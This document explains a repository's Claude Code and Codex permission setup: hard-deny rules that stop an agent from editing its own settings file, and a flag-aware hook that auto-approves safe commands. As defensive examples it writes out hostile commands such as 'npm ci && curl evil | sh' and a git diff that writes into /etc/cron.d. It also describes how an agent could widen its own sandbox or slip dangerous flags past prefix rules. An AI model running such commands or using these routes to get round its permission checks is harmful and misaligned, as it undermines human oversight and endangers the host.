# Agent Sandbox & Off-Limits Config

This file explains the permission posture committed in `.claude/settings.json`:
what an autonomous agent (Claude Code) is auto-allowed to run, what it is
hard-blocked from touching, and how a human changes any of it. Read this if a
tool call was unexpectedly **denied** or unexpectedly **auto-approved**.

## Two off-limits files (hard-blocked, not prompted)

The `permissions.deny` block blocks `Edit` and `Write` to exactly two paths:

| File | Why it is off-limits |
|------|----------------------|
| `.claude/settings.json` | It defines the agent's OWN permissions, hooks, and deny rules. Letting an agent edit it would let the agent widen its own sandbox — rules cannot constrain the thing that governs them. |
| `.codex/config.toml` | The Codex CLI's committed config (sandbox mode, approval policy, MCP servers). Same self-governance problem for the Codex agent, and a permissive profile here has regressed before — see the Codex permissive-profile guard wired into `.github/workflows/ci.yml`. |

`deny` is a HARD block: the agent gets a refusal, not a "do you want to allow
this?" prompt. The paths are root-anchored (`/.claude/...`, `/.codex/...`) and
denied for BOTH `Edit` and `Write` — they are distinct tools, and a deny on one
does not imply the other.

### How these files actually change

A human edits them by hand, in a normal editor or via Claude Code's interactive
`/permissions` UI — neither path goes through the `Edit`/`Write` tools the deny
rules gate. CI re-checks both on every change: `settings-permissions.test.sh`
validates the permissions posture, and the Codex guard in `ci.yml` rejects a
permissive Codex profile.

### If an agent legitimately needs one of these changed

It cannot do it itself, by design. It should surface the exact change it wants and
why, and let a human make the edit (or temporarily lift the rule via
`/permissions`). Widening the sandbox is a human decision recorded in a reviewable
diff — not something the agent can do mid-task.

## What IS auto-approved (two complementary layers)

Safe read/build/test commands are auto-approved so the agent does not stop to ask
for routine work. Two layers cooperate, and the split between them is deliberate:
a native `permissions.allow` prefix rule is **flag-blind** — `Bash(git diff:*)`
matches `git diff HEAD` and `git diff --output=/etc/cron.d/evil` (arbitrary file
write) and `git diff -x ./evil.sh` (runs an arbitrary program) alike. So a command
goes on the static fast-path **only if it is safe with ANY argument**; everything
whose danger lives in a *flag* is handled by the hook, which can inspect flags.

1. **Static `permissions.allow`** — Claude Code's native fast-path. Restricted to
   commands that cannot be weaponized by an argument: `npm ci`/`install`/`run`/
   `test` (build/test — they run the project's own trusted package scripts),
   `npm ls` (a pure read), and `git status`/`rev-parse` (pure reads).
   Prefix rules (`Bash(npm ci:*)`) match the command and its arguments. Notably
   ABSENT, and intentionally so: `git diff`/`log`/`show` and `cargo check` (their
   `--output`/`--ext-diff`/`-x`/`--config` flags write files or run programs), the
   `npx` JS tools (`vitest`/`eslint`/`tsc`/`playwright` — `--config`/`--reporter`/
   `--format`/`-f` load a file that is itself executable code), and `npm audit`
   (bare `npm audit` is a read, but a prefix rule is subcommand-blind and would
   auto-approve `npm audit fix`, which runs `npm install` lifecycle scripts and
   rewrites the lockfile). Those are safe in their everyday form but flag- or
   subcommand-sensitive, so they live in the flag-aware hook instead — never on the
   blunt fast-path. This keeps the static list safe regardless of how the hook
   behaves.

2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — the
   comprehensive flag-aware layer. It auto-approves the flag-sensitive build/read
   tools the static list omits (`git diff`/`log`/`show`, `cargo check`, `npx
   vitest`/`eslint`/`tsc`/`playwright`) **in their safe form**, plus commands the
   static list never enumerates (`npx @axe-core/cli`, `npx @axe-core/reporter`,
   `npx skills`, `git worktree list`/`shortlog`/`describe`/`ls-files`/`stash list`/
   `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`,
   `npm audit` and `npm audit --<flag>` — but NOT `npm audit fix`). It
   emits an `allow` decision for a known-safe SINGLE command, `ask` for everything
   else, and ALWAYS exits 0 — it never hard-blocks. Two gates fire BEFORE the
   allow-list is consulted:
   - **Operator gate** — refuses any compound, piped, redirected, substituted,
     variable-expanded, or multi-line command even when the leading token is safe
     (`npm ci && curl evil | sh` prefix-matches `npm ci`).
   - **Flag gate** — refuses any command carrying a program-execution, file-write,
     or module-loading flag (`--config`, `--output`, `--ext-diff`/`--extcmd`/`-x`,
     `--exec`/`--upload-pack`/`--receive-pack`, and `--reporter` — vitest/playwright
     `import()` a reporter module). The gate is value-blind: it cannot tell a builtin
     `--reporter=verbose` from `--reporter=./pwn.js`, so even the harmless builtin
     form defers to a prompt — a deliberate, low-frequency cost. eslint's `--format`/`-f` load a formatter module
     the same way and are gated WITHIN `npx` only: `git log --format=...` is a benign
     pretty-print string and `npm install -f` means `--force`, so a global gate
     would wrongly defer those. These need no shell operator, so the operator gate
     never sees them — the flag itself is the payload.

   Its allow-list and exact allow/ask/defer contract are pinned by
   `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.

Deliberately NOT auto-approved by either layer (they defer to a prompt):
`git branch`/`git tag` (their flag forms mutate refs — `git branch -D`, `git tag
-d/-f`, bare `git tag <name>` creates a tag — and a prefix gate cannot tell the
read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
`package.json`; only `npm pkg get` is auto-approved), `npm audit fix` (runs
`npm install` lifecycle scripts and rewrites the lockfile; only the read forms
`npm audit` / `npm audit --<flag>` are auto-approved), `npm exec` (runs arbitrary
package binaries), and `npx drizzle-kit` (`drop`/`push` are DB-destructive,
`generate` writes migration files).

Anything covered by neither layer falls through to a normal permission prompt. The
default is always "ask the human" — never silently allow, never silently block.
